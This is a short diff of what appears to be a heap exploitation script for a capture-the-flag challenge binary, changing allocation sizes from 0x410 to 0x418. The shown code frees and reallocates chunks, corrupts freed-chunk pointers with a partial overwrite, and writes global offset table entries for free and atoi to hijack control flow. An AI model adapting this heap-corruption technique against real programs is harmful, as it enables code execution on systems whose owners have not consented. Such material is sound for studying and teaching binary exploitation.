@@ -33,19 +33,19 @@ def destroy(p, index: int):
 def main():
     p = get_process()
 
-    create(p, 0x410)
-    create(p, 0x410)
+    create(p, 0x418)
+    create(p, 0x418)
     create(p, 0x421)
 
     destroy(p, 0)
     program(p, 0, p64(0) + p16(0xf940 - 0x10))
-    create(p, 0x410)
+    create(p, 0x418)
     destroy(p, 0)
 
     destroy(p, 1)
     program(p, 1, p64(elf.sym.robot_memory_size))
-    create(p, 0x410)
-    create(p, 0x410)
+    create(p, 0x418)
+    create(p, 0x418)
 
     program(p, 1, p64(0x1000) + p64(0) + p32(1) * 5 + p64(0) + p32(0) +
             p64(elf.got.free) + p64(elf.got.atoi) + p64(elf.got.atoi))
